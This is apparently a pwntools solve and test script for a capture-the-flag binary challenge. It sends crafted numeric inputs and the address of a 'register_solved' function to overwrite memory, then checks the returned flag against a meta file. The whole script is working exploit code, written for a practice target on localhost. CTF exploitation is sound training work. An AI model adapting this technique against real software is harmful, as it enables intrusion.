import os
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


# For local binary testing
def solve(p):
    binary = ELF(str(HERE / "ai"))
    context.terminal = ['kitty', '-e']
    #gdb.attach(p, """ """)
    p.sendline(b"125")
    for i in range(105):
        p.sendline(b"104")
    # Only first 32bit needed for address
    p.sendline(str(binary.sym['register_solved']).encode()) 
    # Top 32 bits need to be 0
    p.sendline(b"0")
    p.sendline(b"a")
    # p.interactive()
    flag = p.recvuntil(b"}\n").decode()
    assert FLAG in flag, flag


### IF BINARY ###
def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    test("localhost", 32000)
    # sh = process("./ai", cwd=f"{os.getcwd()}")
    # solve(sh)
